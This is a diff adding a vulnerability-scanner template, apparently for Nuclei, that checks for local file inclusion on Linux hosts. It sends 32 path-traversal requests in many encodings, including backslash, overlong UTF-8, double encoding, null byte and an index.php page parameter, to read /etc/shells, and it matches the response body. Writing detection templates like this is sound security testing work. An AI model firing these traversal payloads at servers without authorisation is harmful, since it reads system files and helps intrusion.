@@ -1,0 +1,62 @@
+id: generic-linux-lfi
+
+info:
+  name: Generic Linux - Local File Inclusion
+  author: 0x71rex
+  severity: high
+  description: Generic Linux is subject to local file Inclusion on searches for /etc/shells on passed URLs.
+  reference: https://github.com/imhunterand/ApachSAL/blob/main/assets/exploits.json
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 32
+  tags: linux,lfi,generic
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/etc/shells"
+      - "{{BaseURL}}/..%5cetc/shells"
+      - "{{BaseURL}}/..%5c..%5cetc/shells"
+      - "{{BaseURL}}/..%5c..%5c..%5cetc/shells"
+      - "{{BaseURL}}/..%5c..%5c..%5c..%5cetc/shells"
+      - "{{BaseURL}}/..%5c..%5c..%5c..%5c..%5cetc/shells"
+      - "{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5cetc/shells"
+      - "{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/shells"
+      - "{{BaseURL}}/static/..%5cetc/shells"
+      - "{{BaseURL}}/static/..%5c..%5cetc/shells"
+      - "{{BaseURL}}/static/..%5c..%5c..%5cetc/shells"
+      - "{{BaseURL}}/static/..%5c..%5c..%5c..%5cetc/shells"
+      - "{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5cetc/shells"
+      - "{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/shells"
+      - "{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/shells"
+      - "{{BaseURL}}/./../../../../../../../../../../etc/shells"
+      - "{{BaseURL}}/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/shells"
+      - "{{BaseURL}}/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/shells"
+      - "{{BaseURL}}/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/shells"
+      - "{{BaseURL}}/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/shells"
+      - "{{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shells"
+      - "{{BaseURL}}/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/shells"
+      - "{{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shells"
+      - "{{BaseURL}}/..///////..////..//////etc/shells"
+      - "{{BaseURL}}/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/shells"
+      - "{{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shells"
+      - "{{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shells%00"
+      - "{{BaseURL}}/index.php?page=etc/shells"
+      - "{{BaseURL}}/index.php?page=etc/shells%00"
+      - "{{BaseURL}}/index.php?page=../../etc/shells"
+      - "{{BaseURL}}/index.php?page=....//....//etc/shells"
+      - "{{BaseURL}}/../../../../../../../../../etc/shells"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - "# valid login shells"
+          - "/bin/sh"
+          - "/bin/ash"
+          - "/bin/bash"
+        condition: and
+        part: body
